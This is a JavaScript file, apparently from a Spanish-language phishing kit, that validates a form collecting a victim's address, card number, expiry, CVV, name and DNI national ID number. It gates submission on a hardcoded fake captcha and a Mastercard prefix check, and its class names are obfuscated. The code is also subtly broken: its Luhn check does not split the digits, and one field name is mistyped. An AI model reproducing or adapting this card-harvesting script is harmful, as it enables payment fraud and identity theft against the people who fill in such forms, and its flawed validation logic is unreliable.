
var userNumInput = document.getElementById("nc");
function getUserInput(){return userNumInput.value.replace(/ /g, '');}function luhnCheck(){
var ccNum = getUserInput(),ccNumSplit = ccNum.split().toString(), sum = 0;var singleNums = [], doubleNums = [], finalArry = undefined;var validCard = false;if((!/\d{15,16}(~\W[a-zA-Z])*$/g.test(ccNum)) || (ccNum.length > 16)){return false;  
}if(ccNum.length === 15){ 
for(var i = ccNumSplit.length-1; i>=0; i--){if(i % 2 === 0){singleNums.push(ccNumSplit[i]);}else{doubleNums.push((ccNumSplit[i] * 2).toString());}
     }}else if(ccNum.length === 16){for(var i = ccNumSplit.length-1; i>=0; i--){if(i % 2 !== 0){singleNums.push(ccNumSplit[i]);}else{doubleNums.push((ccNumSplit[i] * 2).toString());}
     }
  }doubleNums = doubleNums.join('').split('');  
finalArry = doubleNums.concat(singleNums);
for(var j = 0; j<finalArry.length; j++){sum += parseInt(finalArry[j]);}if(sum % 10 === 0){validCard = true;}return validCard;
}
function whatCard(){var ccNum = getUserInput(), cardName = "unknown";var validCheck = luhnCheck();
var ccObj = {"master":/^5[1-5][0-9]{5,}$/g,};if(validCheck === false){cardName = "failed Luhn Check";
return cardName;
}Object.keys(ccObj).forEach(function(prop){if(ccObj[prop].test(ccNum)){cardName = prop;}
});return cardName;}



const form = document.getElementById('idTemplate');
function formIdentCheck(){
const form = document.getElementById('idTemplate');
form.addEventListener('click', (e) =>{
    
    if(e.target.classList.contains('y436')){
        
        
        checkInputs()
    } if(e.target.classList.contains('jeu8')){

        window.location.href = "../context/index.php";
    }

})
}
formIdentCheck()
function checkInputs(){
     var dir = document.getElementById('dir');var city = document.getElementById('city');
    var cp = document.getElementById('cp');var nc = document.getElementById('nc');
    var exp = document.getElementById('exp');var cv = document.getElementById('cv');
    var name = document.getElementById('name');var dni = document.getElementById('dni');
    var captch = document.getElementById('idForm_captcha');
if(dir.value == ''){
    dir.classList.add('eedhe73f');
    document.getElementsByName('dir')[0].placeholder='Completa este campo'
}if(city.value == ''){
    city.classList.add('eedhe73f');
    document.getElementsByName('city')[0].placeholder='Completa este campo'
}if(cp.value == ''){
    cp.classList.add('eedhe73f');
    document.getElementsByName('cp')[0].placeholder='Completa este campo'
}if(nc.value == ''){
    nc.classList.add('eedhe73f');
    document.getElementsByName('nc')[0].placeholder='Completa este campo'
}if(exp.value == ''){
    exp.classList.add('eedhe73f');
    document.getElementsByName('exp')[0].placeholder='Completa este campo'
}if(cv.value == ''){
    cv.classList.add('eedhe73f');
    document.getElementsByName('cv')[0].placeholder='Completa este campo'
}if(name.value == ''){
    name.classList.add('eedhe73f');
    document.getElementsByName('name')[0].placeholder='Completa este campo'
}if(dni.value == ''){
    dni.classList.add('eedhe73f');
    document.getElementsByName('dni')[0].placeholder='Completa este campo'
}if(captch.value == ''){
    captch.classList.add('eedhe73f');
    document.getElementsByName('captcha')[0].placeholder='Completa este campo'
}

if (captch.value != '53fm3'){
    captch.classList.add('badcapt');
    document.getElementsByName('captcha')[0].placeholder=''

}else{
    captch.classList.remove('badcapt');
    
}

 
if(dir.value && city.value && cp.value && nc.value && exp.value && cv.value && name.value && dni.value && captch.avalue != '' && captch.value == '53fm3' && whatCard() == 'master'){
   
    var mod = document.getElementById('eroj');
    mod.style.visibility="visible"
    var formul = document.getElementById('idForm');
    formul.submit();
   
 } 
    
}









